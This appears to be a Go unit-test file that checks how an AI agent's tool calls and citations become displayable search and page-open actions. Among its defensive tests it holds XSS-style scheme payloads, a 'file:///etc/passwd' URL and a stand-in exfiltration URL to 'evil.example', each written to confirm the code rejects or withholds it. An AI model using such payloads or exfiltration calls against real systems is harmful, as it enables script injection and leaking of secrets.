/*
 * Copyright (c) 2026. TxnLab Inc.
 * SPDX-License-Identifier: Apache-2.0
 */

package tools

import (
	"encoding/json"
	"strings"
	"testing"
	"unicode/utf8"
)

func TestActionForCall_ToolMapping(t *testing.T) {
	cases := []struct {
		name string
		tool string
		args string
		want *ToolAction
	}{
		{"web search", "zs_web_search", `{"query":"algorand consensus"}`,
			&ToolAction{Type: ActionTypeSearch, Query: "algorand consensus"}},
		{"image search", "zs_image_search", `{"query":"puffin"}`,
			&ToolAction{Type: ActionTypeSearch, Query: "puffin"}},
		{"web read", "zs_web_read", `{"url":"https://example.com/a"}`,
			&ToolAction{Type: ActionTypeOpenPage, URL: "https://example.com/a"}},
		{"search ignores extra args", "zs_web_search", `{"query":"x","max_results":5,"page":2}`,
			&ToolAction{Type: ActionTypeSearch, Query: "x"}},
		{"get_time has nothing to show", "zs_get_time", `{}`, nil},
		{"image generation has nothing to show", "zs_image_generation", `{"prompt":"a cat"}`, nil},
		{"image edit has nothing to show", "zs_image_edit", `{"prompt":"bluer"}`, nil},
		{"unknown tool", "zs_something_new", `{"query":"x"}`, nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ActionForCall(tc.tool, json.RawMessage(tc.args))
			if tc.want == nil {
				if got != nil {
					t.Fatalf("want nil action, got %+v", got)
				}
				return
			}
			if got == nil {
				t.Fatal("want action, got nil")
			}
			if got.Type != tc.want.Type || got.Query != tc.want.Query || got.URL != tc.want.URL {
				t.Fatalf("want %+v, got %+v", tc.want, got)
			}
		})
	}
}

// Arguments arrive as the raw accumulated stitcher buffer with no JSON
// validation anywhere in the stitch path, so every one of these is a shape
// the emit site can actually be handed. All must yield nil — never a
// partial action, never a panic.
func TestActionForCall_MalformedArgsYieldNil(t *testing.T) {
	bad := []string{
		``,                         // backend emitted output_item.added with no deltas
		`{`,                        // stream truncated mid-object
		`{"query":`,                // truncated mid-value
		`null`,                     // valid JSON, not an object
		`[]`,                       // valid JSON, wrong container
		`"just a string"`,          // valid JSON, wrong type
		`{"q":"x"}`,                // model invented the key
		`{"query":123}`,            // wrong value type
		`{"query":null}`,           // explicit null
		`{"query":"   "}`,          // whitespace only
		`{"query":""}`,             // empty
		`{"url":""}`,               // empty url (checked via web_read below)
		`{"nested":{"query":"x"}}`, // right key, wrong depth
	}
	for _, args := range bad {
		for _, tool := range []string{"zs_web_search", "zs_image_search", "zs_web_read"} {
			if got := ActionForCall(tool, json.RawMessage(args)); got != nil {
				t.Errorf("%s(%q): want nil, got %+v", tool, args, got)
			}
		}
	}
}

func TestActionForCall_QueryCappedOnRuneBoundary(t *testing.T) {
	// Multi-byte runes so a naive byte slice would split one.
	long := strings.Repeat("é", 4000)
	args, err := json.Marshal(map[string]string{"query": long})
	if err != nil {
		t.Fatal(err)
	}
	got := ActionForCall("zs_web_search", args)
	if got == nil {
		t.Fatal("want action, got nil")
	}
	if len(got.Query) > maxActionQueryBytes {
		t.Fatalf("query not capped: %d bytes > %d", len(got.Query), maxActionQueryBytes)
	}
	if len(got.Query) == 0 {
		t.Fatal("cap truncated the query to nothing")
	}
	if !utf8.ValidString(got.Query) {
		t.Fatal("cap split a multi-byte rune — result is not valid UTF-8")
	}
}

// A URL is actionable — consumers render it as a link — so an over-long one
// is dropped rather than clipped. A truncated URL would link somewhere other
// than the page the node actually fetched.
func TestActionForCall_OverlongURLDroppedNotTruncated(t *testing.T) {
	long := "https://example.com/" + strings.Repeat("a", maxActionURLBytes)
	args, err := json.Marshal(map[string]string{"url": long})
	if err != nil {
		t.Fatal(err)
	}
	if got := ActionForCall("zs_web_read", args); got != nil {
		t.Fatalf("want nil for an over-long url, got %+v (a clipped url is a wrong link)", got)
	}

	// Just under the bound still comes through, verbatim.
	ok := "https://example.com/" + strings.Repeat("a", 100)
	args, err = json.Marshal(map[string]string{"url": ok})
	if err != nil {
		t.Fatal(err)
	}
	got := ActionForCall("zs_web_read", args)
	if got == nil || got.URL != ok {
		t.Fatalf("want the url verbatim, got %+v", got)
	}
}

// Hygiene at the source: an honest node never advertises a scheme a consumer
// would refuse to link. (Consumers must still refuse it themselves — the node
// is not trusted by the client.)
func TestActionForCall_RejectsNonHTTPSchemes(t *testing.T) {
	for _, bad := range []string{
		"javascript:alert(1)",
		"data:text/html;base64,PHNjcmlwdD4=",
		"vbscript:msgbox(1)",
		"file:///etc/passwd",
		"ftp://example.com/x",
		"//example.com/no-scheme",
		"not a url at all",
		"http://",  // no host
		"https://", // no host
	} {
		args, err := json.Marshal(map[string]string{"url": bad})
		if err != nil {
			t.Fatal(err)
		}
		if got := ActionForCall("zs_web_read", args); got != nil {
			t.Errorf("ActionForCall(%q) = %+v, want nil", bad, got)
		}
	}
	for _, good := range []string{"http://example.com/a", "https://example.com/a?b=c#d"} {
		args, err := json.Marshal(map[string]string{"url": good})
		if err != nil {
			t.Fatal(err)
		}
		if got := ActionForCall("zs_web_read", args); got == nil || got.URL != good {
			t.Errorf("ActionForCall(%q) = %+v, want it through verbatim", good, got)
		}
	}
}

func TestSourcesFromCitations_RejectsNonHTTPSchemes(t *testing.T) {
	got := SourcesFromCitations([]CitationEffect{
		{URL: "javascript:alert(1)"},
		{URL: "https://ok.example"},
		{URL: "data:text/html,x"},
	})
	if len(got) != 1 || got[0].URL != "https://ok.example" {
		t.Fatalf("want only the http(s) source, got %+v", got)
	}
}

func TestSourcesFromCitations_DropsOverlongURL(t *testing.T) {
	long := "https://example.com/" + strings.Repeat("a", maxActionURLBytes)
	got := SourcesFromCitations([]CitationEffect{
		{URL: long},
		{URL: "https://ok.example"},
	})
	if len(got) != 1 || got[0].URL != "https://ok.example" {
		t.Fatalf("want only the sane url, got %+v", got)
	}
}

// The load-bearing asymmetry: the preflight variant must withhold
// zs_web_read's URL even though the plain variant extracts it fine. If
// someone "simplifies" these into one function, this fails.
func TestActionForCallPreflight_WithholdsWebReadURL(t *testing.T) {
	args := json.RawMessage(`{"url":"https://evil.example/exfil?d=secret"}`)

	if got := ActionForCall("zs_web_read", args); got == nil || got.URL == "" {
		t.Fatalf("precondition: ActionForCall should extract the URL, got %+v", got)
	}
	if got := ActionForCallPreflight("zs_web_read", args); got != nil {
		t.Fatalf("preflight must withhold the URL before the provenance gate runs, got %+v", got)
	}
}

// ...but preflight must NOT be a blanket nil, or the whole feature is dead
// on the in_progress frame.
func TestActionForCallPreflight_PassesSearchQuery(t *testing.T) {
	got := ActionForCallPreflight("zs_web_search", json.RawMessage(`{"query":"algorand tps"}`))
	if got == nil {
		t.Fatal("preflight dropped a search query")
	}
	if got.Type != ActionTypeSearch || got.Query != "algorand tps" {
		t.Fatalf("want search/algorand tps, got %+v", got)
	}
}

func TestSourcesFromCitations(t *testing.T) {
	t.Run("dedups by url in first-seen order and drops empties", func(t *testing.T) {
		got := SourcesFromCitations([]CitationEffect{
			{URL: "https://b.example", Title: "B"},
			{URL: "", Title: "blank"},
			{URL: "https://a.example", Title: "A"},
			{URL: "https://b.example", Title: "B again"},
			{URL: "   ", Title: "whitespace"},
		})
		want := []string{"https://b.example", "https://a.example"}
		if len(got) != len(want) {
			t.Fatalf("want %d sources, got %d (%+v)", len(want), len(got), got)
		}
		for i := range want {
			if got[i].URL != want[i] {
				t.Errorf("source %d: want %q, got %q", i, want[i], got[i].URL)
			}
			if got[i].Type != "url" {
				t.Errorf("source %d: want type %q, got %q", i, "url", got[i].Type)
			}
		}
	})

	t.Run("caps", func(t *testing.T) {
		cs := make([]CitationEffect, 0, maxActionSources*3)
		for i := 0; i < maxActionSources*3; i++ {
			cs = append(cs, CitationEffect{URL: "https://example.com/" + string(rune('a'+i%26)) + string(rune('a'+i/26))})
		}
		if got := SourcesFromCitations(cs); len(got) != maxActionSources {
			t.Fatalf("want %d sources after cap, got %d", maxActionSources, len(got))
		}
	})

	t.Run("nil for empty and all-blank input", func(t *testing.T) {
		if got := SourcesFromCitations(nil); got != nil {
			t.Errorf("want nil for nil input, got %+v", got)
		}
		if got := SourcesFromCitations([]CitationEffect{{URL: ""}, {URL: "  "}}); got != nil {
			t.Errorf("want nil when every url is blank, got %+v", got)
		}
	})
}

// Titles are scraped third-party HTML. They must not ride the action —
// the client joins URL→title from url_citation annotations instead.
func TestSourcesFromCitations_DropsTitle(t *testing.T) {
	got := SourcesFromCitations([]CitationEffect{{URL: "https://a.example", Title: "Some Scraped Title"}})
	b, err := json.Marshal(got)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(b), "Some Scraped Title") || strings.Contains(string(b), "title") {
		t.Fatalf("source carries a title: %s", b)
	}
}
